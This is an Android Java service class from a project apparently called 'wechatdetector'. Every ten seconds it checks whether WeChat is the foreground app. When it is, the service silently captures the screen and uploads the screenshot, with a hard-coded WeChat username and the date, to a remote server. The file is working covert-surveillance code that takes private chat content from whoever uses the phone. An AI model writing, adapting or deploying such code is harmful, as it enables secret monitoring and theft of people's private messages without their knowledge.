package com.zou.wechatdetector.activity;

import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.annotation.Nullable;
import android.util.DisplayMetrics;
import android.util.Log;
import android.widget.Toast;

import com.zou.wechatdetector.bean.GsonUploadFileResultBean;
import com.zou.wechatdetector.utils.Constants;
import com.zou.wechatdetector.utils.Tools;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Retrofit;
import retrofit2.adapter.rxjava.RxJavaCallAdapterFactory;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;
import rx.Observable;
import rx.Observer;
import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;

/**
 * Created by zou on 2018/4/9.
 */

public class MainService extends Service {
    public static final String TAG = "MainService";
    private Thread detectorThread;
    private ImageReader mImageReader;
    private VirtualDisplay captureVirtualDisplay;
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private Upload uploadService;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        EventBus.getDefault().register(this);
        initData();
        detectorThread = new Thread(){
            @Override
            public void run() {
                while(true) {
                    try {
                        Thread.sleep(10000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    String foregroundApp = Tools.getTopAppPackageName(MainService.this);
                    Log.i(TAG,foregroundApp);
                    if(foregroundApp.equals("com.tencent.mm")) {
                        Log.i(TAG,"captureScreen");
                        createVirtualDisplay();
                        captureScreen();
                    }else{
                        Log.i(TAG,"noCaptureScreen");
                    }
                }
            }
        };

    }

    @Subscribe
    public void onEvent(Intent data){
        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        assert projectionManager != null;
        mediaProjection = projectionManager.getMediaProjection(Activity.RESULT_OK, data);
        detectorThread.start();
    }

    private void initData() {
        Retrofit retrofit = new Retrofit.Builder()
                .addConverterFactory(GsonConverterFactory.create())
                .addCallAdapterFactory(RxJavaCallAdapterFactory.create())
                .baseUrl(Constants.BASE_URL)
                .build();
        uploadService = retrofit.create(Upload.class);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        EventBus.getDefault().unregister(this);
    }

    private void createVirtualDisplay(){
        DisplayMetrics metrics = new DisplayMetrics();
        mImageReader = ImageReader.newInstance(720, 1080, PixelFormat.RGBA_8888, 1);
        captureVirtualDisplay = mediaProjection.createVirtualDisplay("MainScreen", 720, 1080, DisplayMetrics.DENSITY_MEDIUM,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mImageReader.getSurface(), null, null);
    }

    /**
     * 截屏
     */
    private void captureScreen() {
        String pathImage = Tools.getSaveImageDirectory();
        DateFormat dateFormat = new SimpleDateFormat("yyyyMMddHHmm");
        String fileName = dateFormat.format(new java.util.Date());
        String nameImage = pathImage+fileName+".png";
        SystemClock.sleep(1000);
        Image image = mImageReader.acquireLatestImage();
        int width = image.getWidth();
        int height = image.getHeight();
        final Image.Plane[] planes = image.getPlanes();
        final ByteBuffer buffer = planes[0].getBuffer();
        int pixelStride = planes[0].getPixelStride();
        int rowStride = planes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * width;
        Bitmap bitmap = Bitmap.createBitmap(width+rowPadding/pixelStride, height, Bitmap.Config.ARGB_8888);
        bitmap.copyPixelsFromBuffer(buffer);
        bitmap = Bitmap.createBitmap(bitmap, 0, 0,width, height);
        image.close();
        if (captureVirtualDisplay == null) {
            return;
        }
        captureVirtualDisplay.release();
        captureVirtualDisplay = null;
//        storeBitmap(nameImage,bitmap);
        toServer(bitmap);
    }

    /**
     *
     * 储存bitmap到CacheDir中
     */
    private void storeBitmap(String path,Bitmap bitmap) {
        try {
            File file = new File(path);
            FileOutputStream out = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG,100,out);
            out.flush();
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void toServer(Bitmap bitmap){
        RequestBody fileBody = RequestBody.create(MediaType.parse("multipart/form-data"),Tools.Bitmap2ByteArray(bitmap));
        MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
        String fileName = Tools.getTimeStamp()+".png";
        builder.addFormDataPart("file",fileName,fileBody);
        builder.addFormDataPart("wechat_user","zoujingyi1992");
        builder.addFormDataPart("date",Tools.getDate());
        List<MultipartBody.Part> partList = builder.build().parts();
        uploadService.uploadFile(partList).subscribeOn(Schedulers.newThread()).observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<GsonUploadFileResultBean>() {
                    @Override
                    public void onCompleted() {

                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e(TAG,"upload error");
                    }

                    @Override
                    public void onNext(GsonUploadFileResultBean gsonUploadFileResultBean) {
                        switch (gsonUploadFileResultBean.getCode()){
                            case 0:
                                Log.i(TAG,"upload ok");
                                break;
                            default:
                                Log.e(TAG,"upload error");
                                break;
                        }
                    }
                });
    }

    interface Upload{
        @Multipart
        @POST("upload")
        Observable<GsonUploadFileResultBean> uploadFile(@Part List<MultipartBody.Part> partList);
    }
}
